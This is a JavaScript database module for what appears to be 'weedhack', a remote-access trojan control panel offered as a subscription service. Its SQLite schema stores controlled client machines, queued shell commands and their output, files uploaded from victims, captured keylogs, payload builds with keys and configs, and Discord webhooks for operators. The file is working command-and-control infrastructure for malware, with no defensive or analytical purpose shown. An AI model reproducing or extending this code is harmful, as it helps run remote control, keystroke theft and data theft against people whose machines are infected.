// language: JavaScript, file: local_db.js
import { DatabaseSync } from 'node:sqlite';
import fs from 'node:fs';
import path from 'node:path';

export const UPLOAD_DIR = './data/uploads';

function ensureDir(p, mode = 0o700) {
  if (!fs.existsSync(p)) fs.mkdirSync(p, { recursive: true, mode });
}
ensureDir('./data');
ensureDir(UPLOAD_DIR);

export const localDb = new DatabaseSync('./data/weedhack.db');
localDb.exec('PRAGMA journal_mode = WAL');
localDb.exec('PRAGMA synchronous = NORMAL');

export const db = {
  query: async (sql, params = []) => {
    const stmt = localDb.prepare(sql);
    const upper = sql.trim().toUpperCase();
    
    if (upper.startsWith('SELECT') || upper.startsWith('PRAGMA')) {
      const rows = stmt.all(...params);
      return [rows, null];
    } else {
      const info = stmt.run(...params);
      return [{ insertId: info.lastInsertRowid, affectedRows: info.changes }, null];
    }
  }
};

export async function initLocalDb() {
  localDb.exec(`
    CREATE TABLE IF NOT EXISTS users (
      id            INTEGER PRIMARY KEY,
      username      TEXT UNIQUE NOT NULL,
      email         TEXT UNIQUE NOT NULL,
      password_hash TEXT NOT NULL,
      account_key   TEXT UNIQUE NOT NULL,
      login_token   TEXT UNIQUE,
      discord_webhook TEXT NOT NULL,
      created_at    INTEGER NOT NULL,
      premium_until INTEGER DEFAULT 0
    );

    CREATE TABLE IF NOT EXISTS clients (
      id         INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id    INTEGER NOT NULL,
      key        TEXT NOT NULL,
      hostname   TEXT NOT NULL,
      ip         TEXT,
      last_seen  INTEGER NOT NULL
    );

    CREATE TABLE IF NOT EXISTS commands (
      id         INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id    INTEGER NOT NULL,
      client_id  INTEGER NOT NULL,
      shell      TEXT NOT NULL,
      line       TEXT NOT NULL,
      output     TEXT,
      status     TEXT NOT NULL DEFAULT 'pending',
      created_at INTEGER NOT NULL
    );

    CREATE TABLE IF NOT EXISTS uploads (
      id          INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id     INTEGER NOT NULL,
      client_id   INTEGER NOT NULL,
      filename    TEXT NOT NULL,
      stored_name TEXT UNIQUE NOT NULL,
      size        INTEGER NOT NULL,
      created_at  INTEGER NOT NULL
    );

    CREATE TABLE IF NOT EXISTS keylogs (
      id         INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id    INTEGER NOT NULL,
      client_id  INTEGER NOT NULL,
      data       TEXT NOT NULL,
      created_at INTEGER NOT NULL
    );

    CREATE TABLE IF NOT EXISTS builds (
      id          INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id     INTEGER NOT NULL,
      name        TEXT NOT NULL,
      stored_name TEXT UNIQUE NOT NULL,
      size        INTEGER NOT NULL,
      base        TEXT NOT NULL,
      key         TEXT NOT NULL,
      config      TEXT NOT NULL,
      created_at  INTEGER NOT NULL
    );

    CREATE INDEX IF NOT EXISTS idx_clients_user ON clients(user_id);
    CREATE INDEX IF NOT EXISTS idx_clients_host ON clients(user_id, hostname);
    CREATE INDEX IF NOT EXISTS idx_cmd_client ON commands(client_id, status);
    CREATE INDEX IF NOT EXISTS idx_cmd_user ON commands(user_id, created_at);
    CREATE INDEX IF NOT EXISTS idx_uploads_client ON uploads(client_id, created_at);
    CREATE INDEX IF NOT EXISTS idx_keylogs_client ON keylogs(client_id, created_at);
    CREATE INDEX IF NOT EXISTS idx_builds_user ON builds(user_id, created_at);
  `);
}